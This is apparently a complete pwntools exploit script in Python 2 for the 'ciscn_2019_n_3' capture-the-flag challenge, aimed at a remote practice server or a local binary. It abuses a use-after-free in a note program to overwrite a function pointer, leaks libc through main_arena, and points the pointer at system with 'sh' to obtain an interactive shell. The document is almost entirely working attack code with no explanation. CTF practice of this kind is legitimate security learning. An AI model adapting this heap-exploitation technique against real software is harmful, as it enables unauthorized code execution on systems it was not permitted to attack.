from pwn import *
from time import *
context.binary = './ciscn_2019_n_3'
context.log_level = 'debug'
context.timeout = None
elf = context.binary



def dbg():
	raw_input()

if args['REMOTE']:
	p = remote('pwn.buuoj.cn', 20139)
	libc = ELF('../x86_libc.so.6')
	main_arena = 0x1B0780
else:
	libc = context.binary.libc
	p = process('./ciscn_2019_n_3')
	#gdb.attach(p, 'b* 0x08048A56')
	main_arena = 0x1b2780

def menu(i):
	p.recvuntil('CNote > ')
	p.sendline(str(i))

def new(idx, size, value):
	menu(1)
	p.recvuntil('Index > ')
	p.sendline(str(idx))
	p.recvuntil('Type > ')
	p.sendline('2')
	p.recvuntil('Length > ')
	p.sendline(str(size))
	p.recvuntil('Value > ')
	p.sendline(value)

	print "new %d sucess" % idx

def delete(idx):
	menu(2)
	p.recvuntil('Index > ')
	p.sendline(str(idx))

	print "delete %d sucess" % idx
def show(idx):
	menu(3)
	p.recvuntil('Index > ')
	p.sendline(str(idx))	

record = 0x0804B080
str_print = 0x080486DE
free_got = elf.got['free']

new(0, 0x80, 'a'*4)
new(1, 0x1c, 'b'*4)

#note1 -> note0 
delete(0)
delete(1)

new(2, 0xc, p32(str_print))		#note2 = note1, content2 = note0
show(0)

p.recvuntil('Value=')
leak_addr = u32(p.recv(4))
libc_base = leak_addr - main_arena - 0x30

system_addr = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))
gadget = libc_base + 0x3ac5c

print "binsh ==> " + hex(binsh)
print "system_addr ==> " + hex(system_addr)

delete(2)
new(3, 0xc, "sh\x00\x00" + p32(system_addr))		#note3 = note2 = note1 , content3 = note0
delete(0)

print "libc_base ==> " + hex(libc_base)

p.interactive()
p.close()